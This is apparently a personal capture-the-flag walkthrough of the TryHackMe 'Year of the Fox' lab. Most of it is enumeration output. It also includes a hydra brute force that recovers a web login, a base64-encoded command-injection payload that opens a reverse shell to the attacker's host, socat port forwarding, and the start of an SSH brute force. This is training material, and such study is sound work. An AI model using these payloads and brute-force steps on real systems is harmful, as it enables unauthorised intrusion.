Year of the Fox IP:10.10.4.252


rustscan:
PORT    STATE SERVICE      REASON
80/tcp  open  http         syn-ack
139/tcp open  netbios-ssn  syn-ack
445/tcp open  microsoft-ds syn-ack



nmap:

PORT    STATE SERVICE     REASON  VERSION
80/tcp  open  http        syn-ack Apache httpd 2.4.29
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=You want in? Gotta guess the password!
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 401 Unauthorized
139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: YEAROFTHEFOX)
445/tcp open  netbios-ssn syn-ack Samba smbd 4.7.6-Ubuntu (workgroup: YEAROFTHEFOX)
Service Info: Hosts: year-of-the-fox.lan, YEAR-OF-THE-FOX

Host script results:
|_clock-skew: mean: -19m58s, deviation: 34m37s, median: 0s
| nbstat: NetBIOS name: YEAR-OF-THE-FOX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   YEAR-OF-THE-FOX<00>  Flags: <unique><active>
|   YEAR-OF-THE-FOX<03>  Flags: <unique><active>
|   YEAR-OF-THE-FOX<20>  Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   YEAROFTHEFOX<00>     Flags: <group><active>
|   YEAROFTHEFOX<1d>     Flags: <unique><active>
|   YEAROFTHEFOX<1e>     Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 48694/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 34643/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 33294/udp): CLEAN (Failed to receive data)
|   Check 4 (port 50174/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: year-of-the-fox
|   NetBIOS computer name: YEAR-OF-THE-FOX\x00
|   Domain name: lan
|   FQDN: year-of-the-fox.lan
|_  System time: 2023-06-28T13:51:50+01:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-06-28T12:51:50
|_  start_date: N/A


nikto:


nikto -h 10.10.4.252                                                                                                                                                                 
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.4.252
+ Target Hostname:    10.10.4.252
+ Target Port:        80
+ Start Time:         2023-06-28 08:50:37 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ / - Requires Authentication for realm 'You want in? Gotta guess the password!'
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 8040 requests: 0 error(s) and 5 item(s) reported on remote host
+ End Time:           2023-06-28 09:02:38 (GMT-4) (721 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested




enum4linux:


┌──(kali㉿kali)-[~/Practice/tryhackme/YearOfTheFox]
└─$ enum4linux -v 10.10.4.252 
[V] Dependent program "nmblookup" found in /usr/bin/nmblookup
[V] Dependent program "net" found in /usr/bin/net
[V] Dependent program "rpcclient" found in /usr/bin/rpcclient
[V] Dependent program "smbclient" found in /usr/bin/smbclient
[V] Dependent program "polenum" found in /usr/bin/polenum
[V] Dependent program "ldapsearch" found in /usr/bin/ldapsearch
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Jun 28 08:52:59 2023

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.4.252
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 =================================================== 
|    Enumerating Workgroup/Domain on 10.10.4.252    |
 =================================================== 
[V] Attempting to get domain name with command: nmblookup -A '10.10.4.252'
[+] Got domain/workgroup name: YEAROFTHEFOX

 =========================================== 
|    Nbtstat Information for 10.10.4.252    |
 =========================================== 
Looking up status of 10.10.4.252
        YEAR-OF-THE-FOX <00> -         B <ACTIVE>  Workstation Service
        YEAR-OF-THE-FOX <03> -         B <ACTIVE>  Messenger Service
        YEAR-OF-THE-FOX <20> -         B <ACTIVE>  File Server Service
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
        YEAROFTHEFOX    <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        YEAROFTHEFOX    <1d> -         B <ACTIVE>  Master Browser
        YEAROFTHEFOX    <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

        MAC Address = 00-00-00-00-00-00

 ==================================== 
|    Session Check on 10.10.4.252    |
 ==================================== 
[V] Attempting to make null session using command: smbclient -W 'YEAROFTHEFOX' //'10.10.4.252'/ipc$ -U''%'' -c 'help' 2>&1
[+] Server 10.10.4.252 allows sessions using username '', password ''

 ========================================== 
|    Getting domain SID for 10.10.4.252    |
 ========================================== 
[V] Attempting to get domain SID with command: rpcclient -W 'YEAROFTHEFOX' -U''%'' 10.10.4.252 -c 'lsaquery' 2>&1
Domain Name: YEAROFTHEFOX
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ===================================== 
|    OS information on 10.10.4.252    |
 ===================================== 
[V] Attempting to get OS info with command: smbclient -W 'YEAROFTHEFOX' //'10.10.4.252'/ipc$ -U''%'' -c 'q' 2>&1
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 10.10.4.252 from smbclient: 
[V] Attempting to get OS info with command: rpcclient -W 'YEAROFTHEFOX' -U''%'' -c 'srvinfo' '10.10.4.252' 2>&1
[+] Got OS info for 10.10.4.252 from srvinfo:
        YEAR-OF-THE-FOXWk Sv PrQ Unx NT SNT year-of-the-fox server (Samba, Ubuntu)
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03

 ============================ 
|    Users on 10.10.4.252    |
 ============================ 
[V] Attempting to get userlist with command: rpcclient -W 'YEAROFTHEFOX' -c querydispinfo -U''%'' '10.10.4.252' 2>&1
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: fox      Name: fox       Desc: 

[V] Attempting to get userlist with command: rpcclient -W 'YEAROFTHEFOX' -c enumdomusers -U''%'' '10.10.4.252' 2>&1
user:[fox] rid:[0x3e8]

 ======================================== 
|    Share Enumeration on 10.10.4.252    |
 ======================================== 
[V] Attempting to get share list using authentication

        Sharename       Type      Comment
        ---------       ----      -------
        yotf            Disk      Fox's Stuff -- keep out!
        IPC$            IPC       IPC Service (year-of-the-fox server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        YEAROFTHEFOX         YEAR-OF-THE-FOX

[+] Attempting to map shares on 10.10.4.252
[V] Attempting map to share //10.10.4.252/yotf with command: smbclient -W 'YEAROFTHEFOX' //'10.10.4.252'/'yotf' -U''%'' -c dir 2>&1
//10.10.4.252/yotf      Mapping: DENIED, Listing: N/A
[V] Attempting map to share //10.10.4.252/IPC$ with command: smbclient -W 'YEAROFTHEFOX' //'10.10.4.252'/'IPC$' -U''%'' -c dir 2>&1
//10.10.4.252/IPC$      [E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

 =================================================== 
|    Password Policy Information for 10.10.4.252    |
 =================================================== 
[V] Attempting to get Password Policy info with command: polenum '':''@'10.10.4.252' 2>&1


[+] Attaching to 10.10.4.252 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] YEAR-OF-THE-FOX
        [+] Builtin

[+] Password Info for Domain: YEAR-OF-THE-FOX

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: 37 days 6 hours 21 minutes 
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: 37 days 6 hours 21 minutes 

[V] Attempting to get Password Policy info with command: rpcclient -W 'YEAROFTHEFOX' -U''%'' '10.10.4.252' -c "getdompwinfo" 2>&1

[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 5


 ============================= 
|    Groups on 10.10.4.252    |
 ============================= 
[V] Getting builtin groups with command: rpcclient -W 'YEAROFTHEFOX' -U''%'' '10.10.4.252' -c 'enumalsgroups builtin' 2>&1

[+] Getting builtin groups:

[+] Getting builtin group memberships:
[V] Getting local groups with command: rpcclient -W 'YEAROFTHEFOX' -U''%'' '10.10.4.252' -c 'enumalsgroups domain' 2>&1

[+] Getting local groups:

[+] Getting local group memberships:
[V] Getting domain groups with command: rpcclient -W 'YEAROFTHEFOX' -U''%'' '10.10.4.252' -c "enumdomgroups" 2>&1

[+] Getting domain groups:

[+] Getting domain group memberships:

 ====================================================================== 
|    Users on 10.10.4.252 via RID cycling (RIDS: 500-550,1000-1050)    |
 ====================================================================== 
[V] Attempting to get SID from 10.10.4.252 with command: rpcclient -W 'YEAROFTHEFOX' -U''%'' '10.10.4.252' -c 'lookupnames administrator' 2>&1
[V] Assuming that user "administrator" exists
[V] User "administrator" doesn't exist.  User enumeration should be possible, but SID needed...
[V] Attempting to get SID from 10.10.4.252 with command: rpcclient -W 'YEAROFTHEFOX' -U''%'' '10.10.4.252' -c 'lookupnames guest' 2>&1
[V] Assuming that user "guest" exists
[V] User "guest" doesn't exist.  User enumeration should be possible, but SID needed...
[V] Attempting to get SID from 10.10.4.252 with command: rpcclient -W 'YEAROFTHEFOX' -U''%'' '10.10.4.252' -c 'lookupnames krbtgt' 2>&1
[V] Assuming that user "krbtgt" exists
[V] User "krbtgt" doesn't exist.  User enumeration should be possible, but SID needed...
[V] Attempting to get SID from 10.10.4.252 with command: rpcclient -W 'YEAROFTHEFOX' -U''%'' '10.10.4.252' -c 'lookupnames domain admins' 2>&1
[V] Assuming that user "domain admins" exists
[V] User "domain admins" doesn't exist.  User enumeration should be possible, but SID needed...
[V] Attempting to get SID from 10.10.4.252 with command: rpcclient -W 'YEAROFTHEFOX' -U''%'' '10.10.4.252' -c 'lookupnames root' 2>&1
[V] Assuming that user "root" exists
[I] Found new SID: S-1-22-1
[V] Attempting to get SID from 10.10.4.252 with command: rpcclient -W 'YEAROFTHEFOX' -U''%'' '10.10.4.252' -c 'lookupnames bin' 2>&1
[V] Assuming that user "bin" exists
[V] Attempting to get SID from 10.10.4.252 with command: rpcclient -W 'YEAROFTHEFOX' -U''%'' '10.10.4.252' -c 'lookupnames none' 2>&1
[V] Assuming that user "none" exists
[I] Found new SID: S-1-5-21-978893743-2663913856-222388731
[V] Attempting to get SIDs from 10.10.4.252 with command: rpcclient -W 'YEAROFTHEFOX' -U''%'' '10.10.4.252' -c lsaenumsid 2>&1
[V] Processing SID S-1-5-32-550
[I] Found new SID: S-1-5-32
[V] Processing SID S-1-5-32-548
[V] Processing SID S-1-5-32-551
[V] Processing SID S-1-5-32-549
[V] Processing SID S-1-5-32-544
[V] Processing SID S-1-1-0
[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
S-1-5-32-500 *unknown*\*unknown* (8)
S-1-5-32-501 *unknown*\*unknown* (8)
S-1-5-32-502 *unknown*\*unknown* (8)
S-1-5-32-503 *unknown*\*unknown* (8)
S-1-5-32-504 *unknown*\*unknown* (8)
S-1-5-32-505 *unknown*\*unknown* (8)
S-1-5-32-506 *unknown*\*unknown* (8)
S-1-5-32-507 *unknown*\*unknown* (8)
S-1-5-32-508 *unknown*\*unknown* (8)
S-1-5-32-509 *unknown*\*unknown* (8)
S-1-5-32-510 *unknown*\*unknown* (8)
S-1-5-32-511 *unknown*\*unknown* (8)
S-1-5-32-512 *unknown*\*unknown* (8)
S-1-5-32-513 *unknown*\*unknown* (8)
S-1-5-32-514 *unknown*\*unknown* (8)
S-1-5-32-515 *unknown*\*unknown* (8)
S-1-5-32-516 *unknown*\*unknown* (8)
S-1-5-32-517 *unknown*\*unknown* (8)
S-1-5-32-518 *unknown*\*unknown* (8)
S-1-5-32-519 *unknown*\*unknown* (8)
S-1-5-32-520 *unknown*\*unknown* (8)
S-1-5-32-521 *unknown*\*unknown* (8)
S-1-5-32-522 *unknown*\*unknown* (8)
S-1-5-32-523 *unknown*\*unknown* (8)
S-1-5-32-524 *unknown*\*unknown* (8)
S-1-5-32-525 *unknown*\*unknown* (8)
S-1-5-32-526 *unknown*\*unknown* (8)
S-1-5-32-527 *unknown*\*unknown* (8)
S-1-5-32-528 *unknown*\*unknown* (8)
S-1-5-32-529 *unknown*\*unknown* (8)
S-1-5-32-530 *unknown*\*unknown* (8)
S-1-5-32-531 *unknown*\*unknown* (8)
S-1-5-32-532 *unknown*\*unknown* (8)
S-1-5-32-533 *unknown*\*unknown* (8)
S-1-5-32-534 *unknown*\*unknown* (8)
S-1-5-32-535 *unknown*\*unknown* (8)
S-1-5-32-536 *unknown*\*unknown* (8)
S-1-5-32-537 *unknown*\*unknown* (8)
S-1-5-32-538 *unknown*\*unknown* (8)
S-1-5-32-539 *unknown*\*unknown* (8)
S-1-5-32-540 *unknown*\*unknown* (8)
S-1-5-32-541 *unknown*\*unknown* (8)
S-1-5-32-542 *unknown*\*unknown* (8)
S-1-5-32-543 *unknown*\*unknown* (8)
S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)
S-1-5-32-1000 *unknown*\*unknown* (8)
S-1-5-32-1001 *unknown*\*unknown* (8)
S-1-5-32-1002 *unknown*\*unknown* (8)
S-1-5-32-1003 *unknown*\*unknown* (8)
S-1-5-32-1004 *unknown*\*unknown* (8)
S-1-5-32-1005 *unknown*\*unknown* (8)
S-1-5-32-1006 *unknown*\*unknown* (8)
S-1-5-32-1007 *unknown*\*unknown* (8)
S-1-5-32-1008 *unknown*\*unknown* (8)
S-1-5-32-1009 *unknown*\*unknown* (8)
S-1-5-32-1010 *unknown*\*unknown* (8)
S-1-5-32-1011 *unknown*\*unknown* (8)
S-1-5-32-1012 *unknown*\*unknown* (8)
S-1-5-32-1013 *unknown*\*unknown* (8)
S-1-5-32-1014 *unknown*\*unknown* (8)
S-1-5-32-1015 *unknown*\*unknown* (8)
S-1-5-32-1016 *unknown*\*unknown* (8)
S-1-5-32-1017 *unknown*\*unknown* (8)
S-1-5-32-1018 *unknown*\*unknown* (8)
S-1-5-32-1019 *unknown*\*unknown* (8)
S-1-5-32-1020 *unknown*\*unknown* (8)
S-1-5-32-1021 *unknown*\*unknown* (8)
S-1-5-32-1022 *unknown*\*unknown* (8)
S-1-5-32-1023 *unknown*\*unknown* (8)
S-1-5-32-1024 *unknown*\*unknown* (8)
S-1-5-32-1025 *unknown*\*unknown* (8)
S-1-5-32-1026 *unknown*\*unknown* (8)
S-1-5-32-1027 *unknown*\*unknown* (8)
S-1-5-32-1028 *unknown*\*unknown* (8)
S-1-5-32-1029 *unknown*\*unknown* (8)
S-1-5-32-1030 *unknown*\*unknown* (8)
S-1-5-32-1031 *unknown*\*unknown* (8)
S-1-5-32-1032 *unknown*\*unknown* (8)
S-1-5-32-1033 *unknown*\*unknown* (8)
S-1-5-32-1034 *unknown*\*unknown* (8)
S-1-5-32-1035 *unknown*\*unknown* (8)
S-1-5-32-1036 *unknown*\*unknown* (8)
S-1-5-32-1037 *unknown*\*unknown* (8)
S-1-5-32-1038 *unknown*\*unknown* (8)
S-1-5-32-1039 *unknown*\*unknown* (8)
S-1-5-32-1040 *unknown*\*unknown* (8)
S-1-5-32-1041 *unknown*\*unknown* (8)
S-1-5-32-1042 *unknown*\*unknown* (8)
S-1-5-32-1043 *unknown*\*unknown* (8)
S-1-5-32-1044 *unknown*\*unknown* (8)
S-1-5-32-1045 *unknown*\*unknown* (8)
S-1-5-32-1046 *unknown*\*unknown* (8)
S-1-5-32-1047 *unknown*\*unknown* (8)
S-1-5-32-1048 *unknown*\*unknown* (8)
S-1-5-32-1049 *unknown*\*unknown* (8)
S-1-5-32-1050 *unknown*\*unknown* (8)
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\fox (Local User)
S-1-22-1-1001 Unix User\rascal (Local User)
[+] Enumerating users using SID S-1-5-21-978893743-2663913856-222388731 and logon username '', password ''
S-1-5-21-978893743-2663913856-222388731-500 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-501 YEAR-OF-THE-FOX\nobody (Local User)
S-1-5-21-978893743-2663913856-222388731-502 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-503 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-504 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-505 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-506 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-507 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-508 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-509 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-510 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-511 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-512 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-513 YEAR-OF-THE-FOX\None (Domain Group)
S-1-5-21-978893743-2663913856-222388731-514 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-515 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-516 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-517 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-518 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-519 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-520 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-521 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-522 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-523 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-524 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-525 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-526 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-527 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-528 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-529 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-530 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-531 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-532 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-533 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-534 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-535 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-536 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-537 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-538 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-539 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-540 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-541 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-542 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-543 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-544 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-545 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-546 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-547 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-548 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-549 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-550 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-1000 YEAR-OF-THE-FOX\fox (Local User)
S-1-5-21-978893743-2663913856-222388731-1001 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-1002 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-1003 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-1004 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-1005 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-1006 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-1007 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-1008 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-1009 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-1010 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-1011 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-1012 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-1013 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-1014 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-1015 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-1016 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-1017 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-1018 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-1019 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-1020 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-1021 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-1022 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-1023 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-1024 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-1025 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-1026 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-1027 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-1028 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-1029 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-1030 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-1031 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-1032 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-1033 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-1034 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-1035 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-1036 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-1037 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-1038 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-1039 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-1040 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-1041 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-1042 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-1043 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-1044 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-1045 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-1046 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-1047 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-1048 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-1049 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-1050 *unknown*\*unknown* (8)

 ============================================ 
|    Getting printer info for 10.10.4.252    |
 ============================================ 
[V] Attempting to get printer info with command: rpcclient -W 'YEAROFTHEFOX' -U''%'' -c 'enumprinters' '10.10.4.252' 2>&1
No printers returned.










It seems that we have 2 users:

S-1-22-1-1000 Unix User\fox (Local User)
S-1-22-1-1001 Unix User\rascal (Local User)



smbclient:

┌──(kali㉿kali)-[~/Practice/tryhackme/YearOfTheFox]
└─$ smbclient -N -L ///10.10.4.252            

        Sharename       Type      Comment
        ---------       ----      -------
        yotf            Disk      Fox's Stuff -- keep out!
        IPC$            IPC       IPC Service (year-of-the-fox server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        YEAROFTHEFOX         YEAR-OF-THE-FOX


smbclient  \\\\10.10.4.252\\yotf -U 'guest'                                                                                                                                                  1 ⨯
Password for [WORKGROUP\guest]:
tree connect failed: NT_STATUS_ACCESS_DENIED


we cant log on as guest on smb

we could try to bruteforce tha passwords for the users;


                                                                                                                                                                                                     
┌──(kali㉿kali)-[~/Practice/tryhackme/YearOfTheFox]
└─$ hydra -l rascal -P /usr/share/wordlists/rockyou.txt 10.10.4.252 http-get -t 64   
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-06-28 09:04:14
[WARNING] You must supply the web page as an additional option or via -m, default path set to /
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking http-get://10.10.4.252:80/
[80][http-get] host: 10.10.4.252   login: rascal   password: elizabeth2
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-06-28 09:05:02


we use burp to intercept the trafic, and to get a reverse shell:


overall body of the request is like so :

{"target":"\";echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuOC4yOS44OS85MDAxIDA+JjE=|base64 -d |bash\n"
}
and now we got the connection :


┌──(kali㉿kali)-[~/Practice/tryhackme/YearOfTheFox]
└─$ nc -lnvp 9001                                                                                                                                                                        
listening on [any] 9001 ...
connect to [10.8.29.89] from (UNKNOWN) [10.10.4.252] 49698
sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@year-of-the-fox:/var/www/html/assets/php$ 


flag1:

www-data@year-of-the-fox:/var/www$ cat web-flag.txt
cat web-flag.txt
THM{Nzg2ZWQwYWUwN2UwOTU3NDY5ZjVmYTYw}



upload linpeas.sh:

╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                                                                                                        
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      -                                                                                                                    
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:22            0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::445                  :::*                    LISTEN      -                   
tcp6       0      0 :::139                  :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -  


www-data@year-of-the-fox:/tmp$ cat /etc/ssh/sshd_config
cat /etc/ssh/sshd_config
#       $OpenBSD: sshd_config,v 1.101 2017/03/14 07:19:07 djm Exp $

# This is the sshd server system-wide configuration file.  See
# sshd_config(5) for more information.

# This sshd was compiled with PATH=/usr/bin:/bin:/usr/sbin:/sbin

# The strategy used for options in the default sshd_config shipped with
# OpenSSH is to specify options with their default value where
# possible, but leave them commented.  Uncommented options override the
# default value.

#Port 22
#AddressFamily any
ListenAddress 127.0.0.1 
#ListenAddress ::


we do a port forwarding in order to be able to brute force the ssh:

┌──(kali㉿kali)-[~/Practice/tryhackme/YearOfTheFox]
└─$ /usr/bin/socat tcp-listen:8888,reuseaddr,fork tcp:localhost:22                                                                                                                             255 ⨯



hydra -l fox -P /usr/share/wordlists/rockyou.txt ssh://10.10.4.252:8888          
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-06-28 09:39:23
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
